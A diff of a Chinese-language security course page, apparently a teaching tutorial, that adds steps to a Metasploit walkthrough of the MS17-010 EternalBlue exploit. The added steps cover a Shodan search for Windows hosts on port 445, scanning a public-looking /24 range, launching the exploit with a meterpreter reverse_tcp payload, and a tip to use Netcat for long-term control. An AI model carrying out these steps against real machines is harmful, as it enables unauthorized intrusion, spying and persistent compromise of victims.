@@ -1643,9 +1643,8 @@ openssl dgst -md5/sha1/sha256/sha384/sha512 test.txt    #执行各种摘要
     <p>
         Metasploit是一款开源、免费的漏洞利用工具，漏洞攻击是指利用目标系统的漏洞，攻击者通过Metasploit执行远程代码。
     </p>
-    <p>
-        使用Metasploit之前，我们一般需利用Nessus、OpenVAS、Nmap等扫描工具锁定目标并发现相关漏洞，下面以windows系统较新的ms17-010漏洞为例。
-    </p>
+    <p>使用Metasploit之前，我们一般需利用Nessus、OpenVAS、Nmap等扫描工具锁定目标并发现相关漏洞，也可使用Metasploit进行测试（最新漏洞请关注<a href="https://www.exploit-db.com/">Exploit-DB</a>）。</p>
+    <p>下面以windows系统较新的ms17-010漏洞为例（该漏洞针对445端口，可在shodan中用<code>port:445 os:"windows"</code>全球进行搜索）。</p>
     <p>一般步骤</p>
     <ol>
         <li>在shell中启动Metasplpoit需要的数据库服务</li>
@@ -1658,27 +1657,39 @@ openssl dgst -md5/sha1/sha256/sha384/sha512 test.txt    #执行各种摘要
     </div>
     <li>在shell中启动Metasploit控制台</li>
     <pre><code>#msfconsole</code></pre>
-    <li>现在进入了控制台，使用如下命令重建Metasploit数据库cache</li>
+    <li>现在进入了控制台，使用如下命令重建Metasploit数据库cache以加快搜索命令的执行</li>
     <div class="highlight">
         <pre><code class="hljs"> msf>db_rebuild_cache  </code></pre>
     </div>
-    <li>使用如下命令搜索与此漏洞相关的攻击程序，注意程序的位置和级别normal、good、great、excellent</li>
+    <li>使用如下命令搜索与此漏洞相关的攻击程序模块，注意程序的位置和级别normal、good、great、excellent</li>
     <div class="highlight">
         <pre><code class="hljs"> msf>search ms17_010   </code></pre>
     </div>
-    <li>使用如下命令使用上一步搜索到的漏洞攻击程序（注意：scanner中的模块可用于测试目标是否可用）</li>
+    <li>使用如下命令使用上一步搜索到的漏洞扫描程序（注意：scanner中的模块可用于测试目标是否可用）</li>
+    <div class="highlight">
+        <pre><code class="hljs"> msf>use auxiliary/scanner/smb/smb_ms17_010</code></pre>
+    </div>
+    <li>设置扫描范围</li>
+    <div class="highlight">
+        <pre><code class="hljs"> msf>set rhosts 202.202.240.0/24</code></pre>
+    </div>
+    <li>实施扫描。注意查看结果，确定那些IP可以进行渗透。</li>
+    <div class="highlight">
+        <pre><code class="hljs"> run</code></pre>
+    </div>
+    <li>确定好IP后，使用如下命令使用上一步搜索到的漏洞攻击程序（注意：exploit目录中的模块用于攻击）</li>
     <div class="highlight">
         <pre><code class="hljs"> msf>use exploit/windows/smb/ms17_010_eternalblue</code></pre>
     </div>    
-    <li>使用如下命令查看一下该模块的用法及选项。注意必填项目，如processname，RHOST等</li>
+    <li>使用如下命令查看一下该模块的用法及选项。注意必填项目，如processname，rhost等</li>
     <div class="highlight">
         <pre><code class="hljs"> msf>show options </code></pre>
     </div>
     <li>使用如下命令设置远程受害主机</li>
     <div class="highlight">
-        <pre><code class="hljs"> msf>set RHOST 10.1.74.113 </code></pre>
+        <pre><code class="hljs"> msf>set rhost 10.1.74.113 </code></pre>
     </div>
-    <li>使用如下命令设置本地攻击主机</li>
+    <li>使用如下命令设置本地攻击主机（默认，可不设置）</li>
     <div class="highlight">
         <pre><code class="hljs"> msf>set LHOST 10.1.74.128 </code></pre>
     </div>
@@ -1691,10 +1702,11 @@ openssl dgst -md5/sha1/sha256/sha384/sha512 test.txt    #执行各种摘要
     <div class="highlight">
         <pre><code class="hljs"> msf>set payload windows/x64/meterpreter/reverse_tcp </code></pre>
     </div>
-    <li>开始行动（run命令也可）。一切正常的话，其控制权已获取，敲 ？查看可用命令，显示/新建/下载文件、键盘记录、屏幕快照、摄像头操作等等，exit退出meterpreter回到Metasploit。</li>
+    <li>开始行动（run命令也可）。一切正常的话，其控制权已获取，敲 ？查看可用命令，显示/新建/下载文件、键盘记录、屏幕快照、摄像头操作、shell命令等等，exit退出meterpreter回到Metasploit。</li>
     <div class="highlight">
         <pre><code class="hljs"> msf>exploit </code></pre>
     </div>
+    <div class="bs-callout bs-callout-info">请结合Netcat进行长期控制</div>
     </ol>
     <p>Metasploit工具异常强大，请继续探索！！！<a href="../data/ns/video/10-Metasploit%20%20to%20Hack%20a%20Remote%20Computer%20.mp4" class="btn btn-primary btn-block" target="_blank">
         <i class="glyphicon glyphicon-save"></i> Metasploit视频1
@@ -1844,7 +1856,7 @@ openssl dgst -md5/sha1/sha256/sha384/sha512 test.txt    #执行各种摘要
         <li>Comparer——是一个实用的工具，通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。</li>
     </ol>
     </p>
-    <p>在Web渗透测试中，Burp Suite异常强大，请好好研究使用的！<a href="../data/ns/video/10-Burp%20Suite.mp4" class="btn btn-primary btn-block" target="_blank">
+    <p>在Web渗透测试中，Burp Suite异常强大，请好好研究使用！<a href="../data/ns/video/10-Burp%20Suite.mp4" class="btn btn-primary btn-block" target="_blank">
         <i class="glyphicon glyphicon-save"></i> Burp Suite视频
     </a></p>
     <a href="../data/ns/Burp Suite Starter.pdf" target="_blank"><img src="../assets/img/burpsuite.png" width="500px"></a>
